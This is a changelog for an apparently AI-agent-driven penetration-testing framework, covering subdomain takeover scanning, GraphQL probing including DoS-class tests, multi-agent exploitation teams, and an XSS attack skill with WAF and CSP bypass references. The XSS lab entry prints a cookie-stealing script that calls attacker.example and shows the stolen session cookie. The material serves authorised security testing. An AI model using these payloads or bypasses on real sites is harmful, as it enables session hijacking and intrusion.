- **Stealth mode integration** (`recon/project_settings.py`) -- new overrides: `NUCLEI_TAKEOVERS_ENABLED=false`, `BADDNS_ENABLED=false`, `SUBJACK_ALL=false`, `SUBJACK_CHECK_NS=true` (DNS-only, safe), `SUBJACK_CHECK_MAIL=true` (DNS-only, safe), `SUBJACK_THREADS=3`, `TAKEOVER_RATE_LIMIT=10`. Subjack stays on in DNS-only mode because CNAME/NS/MX resolution doesn't generate HTTP traffic to the target and is safe at low concurrency; HTTP-fingerprint Nuclei layer and AGPL BadDNS sidecar are disabled outright
- **docker-compose integration** (`docker-compose.yml`) -- new `baddns-scanner` service under the `tools` profile that builds `redamon-baddns:latest` from `baddns_scan/Dockerfile`. Lazy-built (not pulled automatically on `up`). Recon code inspects the image with `docker image inspect` before first use and skips the BadDNS layer with a clear warning (`image not found on host -- run docker compose --profile tools build baddns-scanner`) if it's missing, so `BADDNS_ENABLED=true` degrades gracefully on first run instead of crashing
- **Workflow + node mapping updates** (`webapp/src/components/projects/ProjectForm/WorkflowView/workflowDefinition.ts`, `nodeMapping.ts`, `PartialReconModal.tsx`, `WorkflowNodeModal.tsx`, `sections/index.ts`, `ProjectForm.tsx`) -- new `{ id: 'SubdomainTakeover', label: 'Subdomain Takeover', enabledField: 'subdomainTakeoverEnabled', group: 6, badge: 'active' }` node rendered in GROUP 6 band alongside Nuclei + GraphQL, with its own settings modal that opens the `TakeoverSection` panel
- **Test coverage** (`recon/tests/test_subdomain_takeover.py` + `recon/tests/fixtures/`) -- new test module covering command builders (`build_subjack_command` argv shape for each flag combo, `build_baddns_command` work-dir mount + module filtering), normalizers (`normalize_subjack_result` filters non-vulnerable rows, `normalize_nuclei_takeover` only keeps takeover-tagged findings, `normalize_baddns_finding` module-to-method mapping for all 10 modules + provider inference chain), provider fingerprinting (`provider_from_signal` rejects CNAME-shaped inputs, `provider_from_cname` longest-match semantics), dedup + scoring (additive rules, verdict boundaries at `threshold` / `threshold + 10`, severity mapping across verdicts, manual-review auto-publish toggle), deterministic IDs (hostname+provider+method hash stability across re-runs, case-insensitivity), and the isolated-wrapper deep-copy guard. `webapp/src/lib/partial-recon-types.test.ts` and `recon-presets.test.ts` updated to include `SubdomainTakeover` in the tool roster
- **Wiki documentation** -- new dedicated page **[Subdomain Takeover Detection](https://github.com/samugit83/redamon/wiki/Subdomain-Takeover-Detection)** covering pipeline position (GROUP 6 Phase A 3-way fan-out diagram), target collection (subdomains vs alive URLs breakdown), all three engines (Subjack flag table, Nuclei takeover differences vs main vuln scan, BadDNS sidecar build + entrypoint + 10-module reference), provider fingerprinting (40+ signals + 12 auto-exploitable list), dedup key + additive scoring rules + verdict mapping + severity map, full parameter reference (21 settings grouped by layer), output structure, graph schema with explicit **input nodes** (Domain / Subdomain / DNSRecord / BaseURL) vs **output nodes** (Vulnerability + HAS_VULNERABILITY + defensive Subdomain) tables and three-tier anchor attachment precedence, RoE inheritance note, stealth mode override table, partial-recon behavior, and implementation notes (Go 1.25 Stage 1d builder, baddns version pinning, orphan container reaping). `Project-Settings-Reference.md` gains a new `## Subdomain Takeover Detection` section with all 21 parameters in 5 grouped tables (master / Subjack / Nuclei takeover / scoring / BadDNS), auto-exploitable provider list, stealth overrides, and partial-recon summary (TOC updated). `_Sidebar.md` + `Home.md` navigation + capability list updated with the new page link
- **Red Zone takeover table** (`webapp/src/app/graph/components/RedZoneTables/TakeoverTable.tsx` + `webapp/src/app/api/analytics/redzone/takeover/route.ts`) -- new analytics table in the graph Red Zone view surfacing deduped `Vulnerability` nodes with `source="takeover_scan"`, one row per finding with hostname, parent anchor type (Subdomain/Domain/defensive), CNAME target, provider, method, verdict chip (confirmed/likely/manual_review), confidence, severity, source tool list, confirmation count, evidence, and first/last-seen timestamps. Supports free-text filtering, pagination (100 rows/page) and XLSX export via the shared Red Zone table shell

### Changed

- **Recon pipeline Phase A fan-out** (`recon/main.py`) -- `phase_a_tools` dict expanded to optionally include `subdomain_takeover` (keyed on `_settings.get('SUBDOMAIN_TAKEOVER_ENABLED', False)`), so the Phase A `ThreadPoolExecutor(max_workers=len(phase_a_tools))` now scales 1 -> 2 -> 3 workers based on which scanners are enabled. Each phase-A tool still writes its result to `combined_result[key]`, appends to `metadata.modules_executed`, persists to disk, and graph-updates via `_graph_update_bg()` as its future completes; failures remain isolated to `metadata.phase_errors[key]`. Phase B (MITRE) stays unchanged and reads only Nuclei's CVEs
- **Recon Dockerfile** (`recon/Dockerfile`) -- new **Stage 1d** (`golang:1.25-alpine AS subjack-builder`) that compiles `github.com/haccer/subjack` with `CGO_ENABLED=0` and a retry wrapper for transient network failures; the resulting static binary is copied into the final runtime stage at `/usr/local/bin/subjack`. Adds ~8 MB to the recon image; baked into all `docker compose --profile tools build recon` runs
- **Graph DB mixin registry** (`graph_db/mixins/recon_mixin.py`) -- `ReconMixin` now composes `TakeoverMixin` so `Neo4jClient` exposes `update_graph_from_subdomain_takeover()` alongside the existing per-module update methods. Import added to `graph_db/mixins/recon/__init__.py` where applicable
- **Agentic base prompt** (`agentic/prompts/base.py`) -- minor wording update so the agent surfaces takeover findings (new `source="takeover_scan"` Vulnerability type) when summarizing graph state to the user

### Notes

- **Minor version bump** (4.1.0 -> 4.2.0) -- additive feature, no breaking changes. Existing projects default to `SUBDOMAIN_TAKEOVER_ENABLED=false` (opt-in) so scan behavior is unchanged until toggled; the BadDNS sidecar is additionally gated behind `BADDNS_ENABLED=false` so the AGPL-3.0 isolated image is never pulled or built without explicit user opt-in. Phase A fan-out change (1 or 2 -> 1-3 workers) is transparent when takeover is disabled -- the executor simply doesn't schedule that task. New settings ship with sensible defaults; no migration required beyond the standard `docker compose exec webapp npx prisma db push`. **One-time host action** when enabling BadDNS: `docker compose --profile tools build baddns-scanner` (documented in the wiki and in the recon logs when `BADDNS_ENABLED=true` but the image is missing). Subjack is baked into the recon image automatically on the next `docker compose --profile tools build recon`

---

## [4.1.0] - 2026-04-20

### Added

- **GraphQL Security Testing module** (`recon/graphql_scan/`) -- dedicated scanner for GraphQL APIs that runs as **GROUP 6 Phase A** in parallel with Nuclei (both consume `BaseURL`/`Endpoint`/`Technology` and emit `Vulnerability` nodes, zero data dependency, so they fan out via `ThreadPoolExecutor` with `_isolated` wrappers that deep-copy `combined_result` to avoid race conditions). Replaces the old sequential GROUP 6 with a true Phase A (Nuclei ∥ GraphQL) + Phase B (MITRE enrichment, sequential — depends on Nuclei CVEs). Disabled by default via `GRAPHQL_SECURITY_ENABLED`. Key components:
  - **5-source endpoint discovery** (`discovery.py`) -- merges candidates from: (1) user-specified URLs in `GRAPHQL_ENDPOINTS`, (2) HTTP probe matches on `Content-Type: application/graphql`, (3) resource-enum endpoints whose path contains `graphql`/`gql`/`query` via POST or expose `query`/`mutation`/`variables`/`operationName` parameters, (4) JS Recon findings typed as `graphql` or `graphql_introspection`, (5) pattern probing on common paths (primary: `/graphql`, `/api/graphql`, `/v1/graphql`, `/v2/graphql`; secondary: `/query`, `/gql`, `/graphiql`, `/playground` tried only on bases with prior GraphQL evidence). Deduplicated, sorted, and filtered through `ROE_EXCLUDED_HOSTS` with `*.example.com` wildcard support before any probe fires
  - **Native introspection test** (`introspection.py`) -- 3-step per-endpoint probe: `POST { __typename }` reachability → simple introspection → full introspection with **configurable TypeRef recursion depth 1-20** (default 10, via `GRAPHQL_DEPTH_LIMIT`) to match the target schema's actual type-wrapping depth (NON_NULL → LIST → NON_NULL → NAMED chains). 10 MB response cap falls back to simple introspection if exceeded. Extracts schema hash (16-char SHA256 prefix for change detection across scans), query/mutation/subscription counts + operation name lists, and sensitive fields matching `password`, `secret`, `token`, `key`, `api`, `private`, `credential`, `auth`, `ssn`, `credit`, `card`, `payment`, `bank`, `account`, `pin`, `cvv`, `salary`, `medical`. Introspection finding severity is dynamic: `info` baseline, bumps to `medium` when mutations > 20 or when sensitive fields are detected
  - **graphql-cop Docker-in-Docker integration** (`misconfig.py`, opt-in via `GRAPHQL_COP_ENABLED`) -- wraps `dolevf/graphql-cop:1.14` for 12 additional misconfiguration checks per endpoint: `field_suggestions` (INFO — "Did you mean..." schema leakage), `detect_graphiql` (MEDIUM — IDE exposure), `get_method_support` (MEDIUM — GET-query CSRF vector), `get_based_mutation` (HIGH — GET-mutation CSRF), `post_based_csrf` (MEDIUM — url-encoded POST accepted), `trace_mode` (INFO — Apollo tracing extension), `unhandled_error_detection` (INFO — stack trace leakage), and four DoS-class tests: `alias_overloading`, `batch_query`, `directive_overloading`, `circular_query_introspection` (all LOW in graphql-cop's rubric, HIGH in our canonical mapping). Runs with `--network host` + `-T` when Tor is enabled, forwards `HTTP_PROXY` via `-x`. Per-test toggles (12 × `GRAPHQL_COP_TEST_*`) applied **post-execution Python-side** because the `1.14` image on DockerHub does NOT honor the `-e` exclusion flag (added in v1.15 main but unreleased on DockerHub) — user intent is enforced on the output, but DoS probes still hit the target if the master toggle is on; for true zero-traffic suppression use `GRAPHQL_COP_ENABLED=false`. Introspection test in graphql-cop is **disabled by default** to deduplicate with the native introspection check
  - **Endpoint capability flags** -- `graphql_graphiql_exposed`, `graphql_tracing_enabled`, `graphql_get_allowed`, `graphql_field_suggestions_enabled`, `graphql_batching_enabled`, `graphql_cop_ran` persisted on the `Endpoint` node **even for negative results** (e.g. "GraphiQL exposed: false" is stored explicitly, not just absent) so the graph captures server state
  - **5 authentication modes** (`auth.py`) -- `bearer` (→ `Authorization: Bearer`), `cookie` (→ `Cookie:`), `basic` (base64 `user:pass` → `Authorization: Basic`), `header` (custom name via `GRAPHQL_AUTH_HEADER`, defaults `X-Auth-Token`), `apikey` (custom name, defaults `X-API-Key`). Values masked in logs (`xxxx...yyyy` for long, `xx***` for short, `username:***` for basic). Same headers propagate to graphql-cop via `-H '{"K":"V"}'` JSON args
  - **Rate limiting + retries** -- global RPS cap via `GRAPHQL_RATE_LIMIT` (0-100, default 10, 0 = unlimited), concurrency clamp via `GRAPHQL_CONCURRENCY` (1-20, default 5, auto-reduced when fewer endpoints than threads, `1` forces sequential mode), urllib3 `Retry` on `429`/`500`/`502`/`503`/`504` via `GRAPHQL_RETRY_COUNT` (0-10, default 3) with exponential backoff `GRAPHQL_RETRY_BACKOFF` (0-10 seconds, default 2.0), per-request `GRAPHQL_TIMEOUT` (1-600 seconds, default 30). Shared retry-enabled `requests.Session` reused across all endpoint probes
  - **Thread-safe parallel execution** -- endpoints tested via `ThreadPoolExecutor(max_workers=concurrency)` with a `threading.Lock` guarding the shared results dict; shared introspection cache across threads to avoid duplicate queries per endpoint; rate-limit delay `1/rate_limit` enforced between submissions
  - **Output structure** -- `combined_result.graphql_scan.summary.{endpoints_discovered, endpoints_tested, endpoints_skipped, introspection_enabled, vulnerabilities_found, by_severity.{critical,high,medium,low,info}}` + `combined_result.graphql_scan.endpoints[<url>].{tested, introspection_enabled, schema_extracted, queries_count, mutations_count, subscriptions_count, schema_hash, operations, error, graphql_cop_ran, graphql_*_exposed/allowed/enabled flags}` + `combined_result.graphql_scan.vulnerabilities[]` with normalized Vulnerability dicts
- **30 new project settings** (`recon/project_settings.py` + webapp + Prisma) -- `GRAPHQL_SECURITY_ENABLED` (master), `GRAPHQL_INTROSPECTION_TEST`, `GRAPHQL_TIMEOUT`, `GRAPHQL_RATE_LIMIT`, `GRAPHQL_CONCURRENCY`, `GRAPHQL_DEPTH_LIMIT`, `GRAPHQL_RETRY_COUNT`, `GRAPHQL_RETRY_BACKOFF`, `GRAPHQL_VERIFY_SSL`, `GRAPHQL_ENDPOINTS`, `GRAPHQL_AUTH_TYPE`, `GRAPHQL_AUTH_VALUE`, `GRAPHQL_AUTH_HEADER` + graphql-cop core (`GRAPHQL_COP_ENABLED`, `GRAPHQL_COP_DOCKER_IMAGE`, `GRAPHQL_COP_TIMEOUT`, `GRAPHQL_COP_FORCE_SCAN`, `GRAPHQL_COP_DEBUG`) + 12 per-test toggles (`GRAPHQL_COP_TEST_FIELD_SUGGESTIONS`, `..._INTROSPECTION` default **false**, `..._GRAPHIQL`, `..._GET_METHOD`, `..._ALIAS_OVERLOADING`, `..._BATCH_QUERY`, `..._TRACE_MODE`, `..._DIRECTIVE_OVERLOADING`, `..._CIRCULAR_INTROSPECTION`, `..._GET_MUTATION`, `..._POST_CSRF`, `..._UNHANDLED_ERROR`). Parameter total 215+ → 245+
- **Stealth mode integration** -- new overrides in `project_settings.py`: `GRAPHQL_RATE_LIMIT=2`, `GRAPHQL_CONCURRENCY=1` (sequential), `GRAPHQL_TIMEOUT=60`, and the four DoS-class graphql-cop tests (`alias_overloading`, `batch_query`, `directive_overloading`, `circular_query_introspection`) forced `false`. Passive introspection probing stays on because it doesn't generate DoS-class traffic
- **Partial Recon support** (`recon/partial_recon_modules/graphql_scanning.py`) -- GraphQL Security scanning added as the 21st partial-recon tool. Modal accepts custom URLs validated against project scope, injected via `GRAPHQL_ENDPOINTS` and expanded by the same discovery pipeline as the full run. Graph targets pulled from existing `BaseURL`, `Endpoint`, and JS Recon findings via `_build_graphql_data_from_graph()` (new in `graph_builders.py`). `GRAPHQL_SECURITY_ENABLED` is force-set to `true` for partial runs regardless of the project toggle; `settings_overrides` from the modal bypass stored settings; optional `url_attach_to` links UserInputs to an existing BaseURL
- **Graph DB mixin** (`graph_db/mixins/graphql_mixin.py`) -- `update_graph_from_graphql_scan()` method with a **schema contract** guard: `KNOWN_VULN_KEYS` and `KNOWN_ENDPOINT_INFO_KEYS` frozensets pin every field the scanner may emit. `_check_unknown_keys()` fires a warning at ingest time if the scanner adds a key without the mixin being updated — no silent drops. Enriches existing `Endpoint` nodes with GraphQL properties (MERGE-based deduplication) and creates `Vulnerability` nodes with deterministic IDs `graphql_{vulnerability_type}_{baseurl}_{path}` so native + graphql-cop findings for the same issue collapse into one node across re-scans
- **GRAPH.SCHEMA.md updates** -- new GraphQL-specific `Endpoint` properties (`is_graphql`, `graphql_introspection_enabled`, `graphql_schema_extracted`, `graphql_schema_hash`, `graphql_schema_extracted_at`, `graphql_queries`, `graphql_mutations`, `graphql_subscriptions`, `graphql_*_count`, plus the 6 graphql-cop capability flags) and new `Vulnerability.source = "graphql_scan"` with 13 `vulnerability_type` values documented (2 native: `graphql_introspection_enabled`, `graphql_sensitive_data_exposure`; 11 from graphql-cop). `evidence` blob schema for graphql-cop findings specified: `curl_verify` (reproducer cURL), `raw_severity`, `graphql_cop_key`
- **Wiki documentation** -- new dedicated page **[GraphQL Security Testing](https://github.com/samugit83/redamon/wiki/GraphQL-Security-Testing)** covering pipeline position, endpoint discovery (5 sources), native introspection test (3-step probe), graphql-cop integration (12 tests + severity mapping + DoS guardrails), 5 auth modes, full parameter reference (30 settings), output structure, graph schema, RoE, stealth overrides, and partial recon. `Project-Settings-Reference.md` gains a new `## GraphQL Security Testing` section with all 30 parameters, endpoint-discovery sources, capability flags, auth behavior table, and per-test toggle table (TOC + parameter total updated to 245+). `Running-Reconnaissance.md` renamed GROUP 6 → **GROUP 6 Phase A** (Nuclei ∥ GraphQL) + **Phase B** (MITRE); main pipeline matrix gains GraphQL row. `Recon-Pipeline-Workflow.md` updates Vulnerability & Security stage produces/consumes/enriches table (new GraphQL Scan row with Endpoint capability-flag enrichments), partial-recon tool-input table (GraphQL Security category added), custom-URLs validation table, and tool count 20 → 21. `_Sidebar.md` + `Home.md` navigation + capability list updated
- **README updates** -- `README.md` tool matrix row for **GraphQL Security** (parallel with Nuclei in GROUP 6 Phase A), new **GraphQL Security Testing** feature-highlight section describing all auto-discovery sources, 5 auth modes, 12 graphql-cop checks, RoE/stealth integration, parameter-count badge 196+ → 245+. `readmes/README.RECON.md` -- high-level pipeline diagram split into Phase A (Nuclei ∥ GraphQL) + Phase B (MITRE); execution-group table updated; new **Module 5b: `graphql_scan`** section with full mermaid flow (5-source discovery → RoE filter → native introspection + graphql-cop parallel) + capabilities table + stealth overrides + schema contract + source layout; detailed Phase5 fan-out diagram expanded; partial-recon line 20 → 21 tools. `readmes/README.VULN_SCAN.md` pipeline-context note rewritten to describe Phase A/B split with `_isolated` wrappers

### Changed

- **Recon pipeline control flow** (`recon/main.py`) -- old sequential vuln-scan → MITRE chain replaced with `phase_a_tools` dict-driven fan-out via `ThreadPoolExecutor(max_workers=len(phase_a_tools))` that dynamically includes `vuln_scan` (when `vuln_scan` in `SCAN_MODULES`) and `graphql_scan` (when `GRAPHQL_SECURITY_ENABLED`). Each phase-A tool's result is written to `combined_result[key]`, appended to `metadata.modules_executed`, persisted to disk, and graph-updated via `_graph_update_bg()` as soon as its future completes. Failures are isolated per-tool to `metadata.phase_errors[key]` — one scanner crashing doesn't block the other. Phase B (MITRE) stays sequential and reads Nuclei's CVEs
- **Scan summary printout** -- new GraphQL block prints endpoints tested, introspection-enabled count, and severity breakdown (critical/high/medium) when `GRAPHQL_SECURITY_ENABLED` and `graphql_scan` key present in `combined_result`

### Notes

- **Minor version bump** (4.0.0 → 4.1.0) -- additive feature, no breaking changes. Existing projects default to `GRAPHQL_SECURITY_ENABLED=false` (opt-in) so scan behavior is unchanged until toggled. Pipeline phasing change (GROUP 6 sequential → Phase A parallel + Phase B sequential) is transparent when GraphQL is disabled — Phase A's fan-out degenerates to a single Nuclei task and Phase B runs identically to the old MITRE step. New settings are added with sensible defaults; no migration required beyond the standard `prisma db push`

---

## [4.0.0] - 2026-04-18

### Added

- **Fireteam (multi-agent deployment)** -- the root agent can now deploy a coordinated team of specialised agent members that work the same target in parallel, each with its own ReAct loop, skill set, and tool budget. Each member runs as a LangGraph subgraph with its own state, reasoning trace, and WebSocket streaming channel; results are collected by a `fireteam_collect_node` that merges findings back into the shared graph. Key components:
  - **Gating** -- master switch `FIRETEAM_ENABLED` (default `true`); prerequisite `PERSISTENT_CHECKPOINTER=true` (LangGraph checkpointer required so mid-deploy state can resume across restarts)
  - **8 project settings** (`project_settings.py` + Prisma) -- `FIRETEAM_MAX_CONCURRENT` (asyncio semaphore permits, default 5), `FIRETEAM_MAX_MEMBERS` (hard cap per deployment, default 5), `FIRETEAM_MEMBER_MAX_ITERATIONS` (per-member ReAct iteration budget, default 20), `FIRETEAM_TIMEOUT_SEC` (wall-clock per fireteam, default 3600 to accommodate 30-min tool timeouts), `FIRETEAM_ALLOWED_PHASES` (default `informational`, `exploitation`, `post_exploitation`), `FIRETEAM_CONFIRMATION_TIMEOUT_SEC` (operator approval window, default 600), `FIRETEAM_PROPENSITY` (1-5 scalar nudging how strongly the LLM is pushed to deploy fireteams, default 3 = baseline)
  - **Mutex groups** -- `TOOL_MUTEX_GROUPS` in `project_settings.py` prevents two fireteam members from concurrently claiming singleton tools (e.g. `metasploit_console` is serialised across the team since only one MSF RPC session exists per project)
  - **Dangerous-tool operator gate** -- when a member's plan includes a dangerous tool (hydra, msfconsole, dos-adjacent tools, etc.), execution pauses on `_tool_confirmation_mode="fireteam_redeploy"` waiting for operator approval, with auto-reject after `FIRETEAM_CONFIRMATION_TIMEOUT_SEC`
  - **Wave-based `plan_tools` execution** -- each member (and the root agent) can emit a single-turn plan of N independent tools executed via `asyncio.gather` in `execute_plan_node`, with per-wave streaming events (`plan_start`, `tool_start`, `tool_output_chunk`, `tool_complete`, `plan_complete`) rendered as a plan card in the chat drawer
  - **Webapp UI integration** -- new Agent Behaviour settings for every fireteam knob, live badges on the chat header for each active member with per-member spinners / iteration counters / stop buttons, and a fireteam card in the sessions view listing members with their current phase and iteration count
  - **Test coverage** -- `tests/test_fireteam_core.py` (collect-node merge semantics, escalation-on-failure paths), `tests/test_fireteam_deploy.py` (mutex group validation, max-members enforcement, propensity-based deploy nudging), `tests/test_fireteam_regressions.py` (historical escalation + state-merge bugs)
- **`PLAN_MAX_PARALLEL_TOOLS` setting** -- per-wave concurrency cap applied uniformly to root agent AND fireteam member plan execution (both paths funnel through `execute_plan_node`). Default 10. Implemented via `asyncio.Semaphore(N)` created per wave: a plan with 20 steps and cap=10 runs the first 10 immediately and queues the other 10 on the semaphore — no tool is dropped, ordering preserved, failures don't leak permits. Primary motivation: prevent SSE head-of-line blocking on the MCP `kali-sandbox` stream when a fireteam wave fans out more parallel tool calls than the server can drain (previously tripped `sse_read_timeout` under heavy concurrency). Prisma field `agentPlanMaxParallelTools` (default 10, range 1-50), exposed in the Agent Behaviour settings UI. New `tests/test_plan_parallelism.py` with 13 tests: setting plumbing (default, override, int coercion), enforcement (peak ≤ cap for 20/cap=4, cap=1 strict serialisation, small wave under cap runs fully parallel, results preserved in index order, failing steps don't leak permits, cap=0 doesn't deadlock, exact 20-steps/cap=10 user scenario), regression guards (plan_data returned intact, empty plan is no-op)
- **MCP dead-session auto-reconnect** -- `MCPToolsManager` (`agentic/tools.py`) now rebuilds its `MultiServerMCPClient` transparently when the `kali-sandbox` SSE stream dies mid-tool-call, eliminating the "agent stuck — restart the container" failure mode that hit fireteam waves hard. Mechanism: generation counter bumped on every successful `get_tools()`, `asyncio.Lock` serialises reconnects, `reconnect(seen_generation)` skips rebuild if another racer already advanced the generation (so a 5-way concurrent fireteam failure collapses to one real rebuild), `_is_mcp_transport_error` walks `__cause__`/`__context__` chain + `ExceptionGroup` sub-exceptions to catch the real error through anyio/httpx layers (`RemoteProtocolError`, `ClosedResourceError`, `BrokenResourceError`, `ConnectError`, `ReadError`, plus "Connection closed" / "unhandled errors in a TaskGroup" string matches), `PhaseAwareToolExecutor.execute()` catches transport errors on MCP-backed tools, invokes `reconnect()`, re-registers fresh tool references, retries the failed call exactly once. Non-MCP tools (`query_graph`, `web_search`, `shodan`, `google_dork`) are excluded from the reconnect path. New `tests/test_mcp_reconnect.py` with 48 tests across 4 classes: `_is_mcp_transport_error` detection (22 tests — direct types, message patterns, cause/context chain, nested `ExceptionGroup`, cycle-safe walker, false-positive guards), generation + reconnect (8 tests — initial state, bumps, failure cases, 5-way concurrent serialisation), `register_mcp_tools` stale cleanup (5 tests), end-to-end executor retry (13 tests — success first try, reconnect-and-retry, reconnect fails → surface original, retry fails → surface retry error, non-transport error skips reconnect, non-MCP tool skips reconnect, wpscan/gau API-key injection preserved on retry, concurrent failures share one rebuild)
- **MCP server supervisor with restart-on-crash** (`mcp/servers/run_servers.py`) -- the parent process that spawns the 5 MCP server children (network_recon, nuclei, metasploit, nmap, playwright) now polls `Process.is_alive()` every 5 s and automatically respawns any dead child with a logged restart counter. Previously a crash (e.g. network_recon dying under heavy fireteam concurrency) left the container in a half-broken state — parent PID 1 still alive, container `STATUS=up`, but the crashed server's port refusing connections and no amount of client-side reconnect could help. Also fixed a pre-existing `AssertionError: can only test a child process` on container restart, caused by uvicorn in a child re-raising SIGTERM and triggering the inherited shutdown handler in the child context (Process objects in the inherited list belong to the parent, so `is_alive()` asserts). Shutdown handler now guards `if os.getpid() != parent_pid: sys.exit(0)`
- **Built-in `xss` attack skill (Skill #6)** -- end-to-end Cross-Site Scripting workflow promoted from `xss-unclassified` fallback to a first-class skill alongside `cve_exploit`, `sql_injection`, `brute_force_credential_guess`, `phishing_social_engineering`, and `denial_of_service`. The agent now ships with a mandatory 8-step workflow covering reflected, stored, DOM-based, and blind XSS. Key components:
  - **Skill ID** `xss` -- registered in `KNOWN_ATTACK_PATHS`, classified by the Intent Router as a green **XSS** badge in the chat drawer
  - **`XSS_TOOLS` workflow prompt** (~16 KB) -- 8 mandatory steps: (1) reuse recon via `query_graph`, (2) surface input vectors via `execute_playwright`, (3) canary reflection sweep via `execute_curl` with the canary `rEdAm0n1337XsS`, (3b) per-char filter probe via `kxss`, (4) context-aware payload selection (HTML body / quoted attribute / unquoted attribute / JS string / JS code / CSS / URL / DOM fragment), (5) DOM XSS via Playwright script-mode init scripts that monkey-patch `innerHTML`/`eval`/`document.write`, (6) verify execution via Playwright `page.on("dialog", ...)` (canonical proof), (7) WAF bypass via dalfox in background mode, (8) prove impact via cookie theft / session hijack
  - **`XSS_BLIND_WORKFLOW` prompt** (~2.7 KB, opt-in) -- interactsh-client OOB callbacks for stored XSS in admin contexts. Identical setup pattern to the SQLi OOB workflow (background launch, registered domain, payload injection, log polling, cleanup). Gated on `XSS_BLIND_CALLBACK_ENABLED` setting + `kali_shell` availability
  - **`XSS_PAYLOAD_REFERENCE` prompt** (~5 KB) -- payloads grouped by injection context (HTML body, attribute quoted/unquoted, JS string, JS code, URL, CSS, DOM fragment), Brute Logic polyglot, 12-row WAF bypass encoding table (URL / double-URL / HTML entity / unicode / case / null-byte / comment break / tag soup / closing-context / `javascript:` variants / string concat / backtick template), and 9-row CSP bypass shortcut table covering `unsafe-inline`, `unsafe-eval`, `'self'` + file upload, JSONP gadgets, nonce reuse, AngularJS / Vue / AngularJS template injection, missing `frame-ancestors`, `<base>` tag hijack
  - **3 project settings** -- `XSS_DALFOX_ENABLED` (default `true`), `XSS_BLIND_CALLBACK_ENABLED` (default `false`, opt-in because callbacks send data to oast.fun), `XSS_CSP_BYPASS_ENABLED` (default `true`)
  - **Behavior block in `build_attack_path_behavior`** -- explicit informational→exploitation transition guidance for the new skill
  - **Test suite** -- new `tests/test_xss_skill.py` with 6 test classes, 46 tests covering state registration, classification wiring, settings defaults, prompt template formatting (placeholders, all 8 steps, dialog handler reference, dalfox background pattern, polyglot fragment, CSP table), get_phase_tools activation logic (skill injection, conditional blind workflow, fallback to unclassified when tools missing), and tool registry presence (dalfox + kxss + interactsh-client in `kali_shell` description). Existing SQLi regression suite (42 tests) remains green
- **`kxss` Go binary added to kali-sandbox** -- per-character XSS filter probe (`go install github.com/Emoe/kxss@latest`) that reports which dangerous chars (`< > " ' ( ) ` : ; { }`) survive each parameter unfiltered. Used by Step 3b of the XSS workflow to eliminate blind tag-spraying. Type A integration -- documented in the `kali_shell` description, no MCP wrapper needed. Live verified: `echo 'https://xss-game.appspot.com/level1/frame?query=hello' | kxss` returns the expected per-char report
- **Argentum Digital -- comprehensive XSS practice lab** (`guinea_pigs/dvws-node/xss-lab/`) -- a fictional B2B consulting firm site (~1,650 LoC, Node.js + Express + headless Chromium) that embeds every XSS vector the new skill can exploit, hidden inside normal-looking site features. Zero references to "XSS", "lab", "vulnerable", or "challenge" anywhere on the site -- the agent has to discover them through recon + canary sweep + context detection. Coverage:
  - **8 reflected contexts** -- HTML body (`/blog/search`), attribute quoted (`/blog/category/:name`), attribute unquoted (`/products/:slug?theme=`), JS string (`/products/:slug?utm_source=`), JS code (`/products/:slug?dim=`), CSS (`/products/:slug?accent=`), URL/href (`/services/redirect?next=`, `/services/embed?widget=`), HTTP header reflection (`/api/track` echoes `User-Agent`)
  - **4 stored surfaces** -- blog comments (HTML body), product reviews (HTML body), profile fields (display name + avatar alt attribute), personal notes (JS string in inline bootstrap)
  - **7 DOM XSS sinks** -- `eval` (ROI calculator with `?expr=`), `document.write` (campaign preview with hash payload), `postMessage` → `innerHTML` (share studio with no origin check), `localStorage` → `setTimeout(string)` (theme builder welcome script), `localStorage` → `innerHTML` (preferences greeting), `document.referrer` (welcome page), jQuery `.html(location.hash)` (deep-linkable tabs)
  - **3 blind XSS surfaces** -- contact form, support ticket portal, careers application. Stored payloads fire in a real headless Chromium "moderation queue" sidecar (`admin-bot.js`) that visits `/argentum/admin/inbox` every 30 seconds. Live verified: `<script>fetch('http://attacker.example/?c='+document.cookie)</script>` exfiltrates the bot's session cookie via outbound request, captured in container logs as `[admin-bot] outbound request: GET http://attacker.example/?c=admin_session=internal-bot-...`
  - **5 WAF bypass tiers** -- disguised as "search engine generations" (`/search/{legacy,v2,secure,enterprise,cloud}`): tier 1 strips literal `<script>` (case-sensitive, bypassable via `<img>` or `<SCRIPT>`); tier 2 strips full HTML tags via regex; tier 3 strips event-handler attributes (`/on\w+\s*=/i`); tier 4 keyword blacklist (case-insensitive); tier 5 multi-pattern mod_security-style filter
  - **6 CSP scenarios** -- disguised as marketing/dashboard/widget pages: `unsafe-inline` (`/marketing/banner`), `unsafe-eval` (`/dashboard/analytics`), JSONP allowlist on google.com (`/widgets/jsonp`), nonce reuse (`/blog/note/:slug`), AngularJS template injection (`/services/wizard`), strict locked-down CSP (`/internal/board` -- the "should resist" demo)
  - **Internal moderation queue** -- `/argentum/admin/inbox` returns 404 to external requests (allow-listed only for loopback or `X-Internal-Bot: 1` header)
  - **Integration into the dvws-node guinea pig** -- `setup.sh` updated to import `~/xss-lab/` (scp'd alongside `setup.sh`), nginx config now proxies `/argentum/*` to the new `argentum:3001` sidecar container while keeping `/`, `/legal`, and DVWS-Node routes intact
- **Webapp UI integration for the new skill** -- the project settings page now shows a **Cross-Site Scripting** toggle (with `Code2` icon) in the Built-In Skills section, defaulted to ON. Updated 4 webapp files: `AttackSkillsSection.tsx` (BUILT_IN_SKILLS array + DEFAULT_CONFIG), `attack-skills/available/route.ts` (server-side list), `phaseConfig.ts` (green XSS badge in chat drawer), Prisma schema (`attackSkillConfig` JSON default). Existing project rows in Postgres backfilled with `xss:true`
- **Wiki documentation** -- `Agent-Skills.md` updated with new TOC entry, overview tables expanded to 6 built-in skills, classification flowchart includes the `xss` branch, and a full Cross-Site Scripting section after SQL Injection covering the 8-step workflow, OOB/blind callbacks, payload reference notes, project settings table, and example workflow. `Project-Settings-Reference.md` gains a Cross-Site Scripting (XSS) settings section with the 3 toggles. `Chat-Skills.md` comparison table updated from "5 fixed" to "6 fixed". `Home.md` skill roster updated

### Changed

- **`KNOWN_ATTACK_PATHS` set** (`agentic/state.py`) -- expanded from 5 to 6 entries; `xss` is no longer routed to the unclassified fallback
- **Classification prompt** (`agentic/prompts/classification.py`) -- new `_XSS_SECTION` description, new `_BUILTIN_SKILL_MAP['xss']` entry, new `_CLASSIFICATION_INSTRUCTIONS['xss']` criteria block. Both for-loops in `build_classification_prompt` extended. The unclassified-fallback section's example values pruned -- `"xss-unclassified"` removed and replaced with a "Key distinction from xss" note pointing requests to the new skill
